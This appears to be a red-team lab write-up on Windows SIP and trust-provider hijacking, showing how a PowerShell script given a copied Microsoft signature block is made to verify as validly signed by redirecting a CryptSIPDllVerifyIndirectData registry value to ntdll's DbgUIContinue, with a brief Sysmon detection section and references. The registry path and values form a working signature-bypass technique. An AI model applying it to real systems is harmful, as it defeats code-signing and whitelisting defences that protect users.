---
description: 'Defense Evasion, Persistence, Whitelisting Bypass'
tags: [#defense-evasion, #persistence]
---

# SIP & Trust Provider Hijacking

In this lab, I will try to sign a simple "rogue" powershell script `test-forged.ps1` that only has one line of code, with **Microsoft's** certificate and bypass any whitelisting protections/policies the script may be subject to if it is not signed.

## Execution

The script that I will try to sign:

![[trust-ps-file.png]]

Just before I start, let's make sure that the script is not signed by using a `Get-AuthenticodeSignature` cmdlet and `sigcheck` by SysInternals:

![[trust-not-signed.png]]

In order to sign the script with Microsoft's certificate, we need to first find a native Microsoft Signed PowerShell script. I used powershell for this:

```csharp
Get-ChildItem -Path C:\*.ps* -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "# SIG # Begin signature block"
```

![[trust-find-signed.png]]

I chose one script at random and simply checked if it was signed - luckily it was:

```bash
type C:\Windows\WinSxS\x86_microsoft-windows-m..ell-cmdlets-modules_31bf3856ad364e35_10.0.16299.15_none_c7c20f51cd336675\Wdac.psd1
```

![[trust-check-if-signing-block-exists.png]]

Let's copy the Microsoft signature block to my script:

![[trust-script-with-ms-signing-code.png]]

Now let's modify registry at:

```text
HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{603BCC1F-4B59-4E08-B724-D2C6297EF351}
```

From:

![[trust-from.png]]

To:

```csharp
// DLL
C:\Windows\System32\ntdll.dll
```

```text
// FuncName
DbgUIContinue
```

![[trust-to.png]]

Now, let's launch a new powershell instance \(for the registry changes to take effect\) and check the signature of the forged script - note how it now shows as signed, verified and valid:

![[trust-signed.png]]

## Observations

Monitoring the following registry keys/values helps discover this suspicious activity:

![[trust-sysmon1.png]]

![[trust-sysmon2.png]]

## References

For all the registry keys/values that should be used as a baseline, please refer to the original research whitepaper by Matt Graeber:   
[SpecterOps Subverting Trust inWindows](https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf)

[attack.mitre.org/wiki/Technique/T1198](https://attack.mitre.org/wiki/Technique/T1198)

[www.youtube.com/watch?v=wxmxxgL6Nz8](https://www.youtube.com/watch?v=wxmxxgL6Nz8)

[pentestlab.blog/2017/11/06/hijacking-digital-signatures](https://pentestlab.blog/2017/11/06/hijacking-digital-signatures/)

[ultimate-sysadmin-fanboy.blogspot.com/2015/06/unable-to-renew-certificate-via.html](http://ultimate-sysadmin-fanboy.blogspot.com/2015/06/unable-to-renew-certificate-via.html)

[blogs.msdn.microsoft.com/sqlforum/2011/01/02/walkthrough-request-a-digital-certificate-from-certificate-server-or-create-a-testing-digital-certificate-to-sign-a-package](https://blogs.msdn.microsoft.com/sqlforum/2011/01/02/walkthrough-request-a-digital-certificate-from-certificate-server-or-create-a-testing-digital-certificate-to-sign-a-package/)

[www.youtube.com/watch?v=WrHTJQovDoY](https://www.youtube.com/watch?v=WrHTJQovDoY)

[www.hanselman.com/blog/SigningPowerShellScripts.aspx](https://www.hanselman.com/blog/SigningPowerShellScripts.aspx)

[github.com/netbiosX/Digital-Signature-Hijack](https://github.com/netbiosX/Digital-Signature-Hijack)

